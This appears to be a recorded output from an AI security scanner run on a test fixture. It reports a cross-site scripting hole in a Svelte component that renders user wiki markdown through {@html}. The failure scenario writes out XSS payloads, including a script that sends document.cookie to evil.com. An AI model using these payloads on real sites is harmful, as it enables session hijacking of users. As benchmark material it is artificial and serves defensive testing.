@@ -1,0 +1,8 @@
+{
+  "key": "29dfb7efebc9ab2af3da75cbf432ef90",
+  "file": "positive/xss/svelte-html-expression.svelte",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"xss\",\n    \"lineNumbers\": [13],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"high\",\n    \"summary\": \"User-authored markdown content is rendered as raw HTML without sanitization, allowing script injection.\",\n    \"rationale\": \"The {@html} directive on line 13 renders `renderedMarkdown` without any sanitization. According to the file comments, this variable contains 'server-rendered markdown from a user-authored wiki page'. Markdown renderers commonly allow raw HTML passthrough, and using {@html} bypasses Svelte's automatic escaping. An attacker can craft wiki page content containing malicious HTML/JavaScript that will execute in victims' browsers.\",\n    \"failureScenario\": \"An attacker creates a wiki page containing markdown like `<img src=x onerror=alert(document.cookie)>` or `<script>fetch('https://evil.com?cookie='+document.cookie)</script>`. When the markdown is rendered to HTML by the server and passed to this component, the {@html} directive executes the malicious script, allowing session hijacking or other attacks against users viewing the wiki page.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.946Z",
+  "elapsedMs": 19861.581153018178
+}
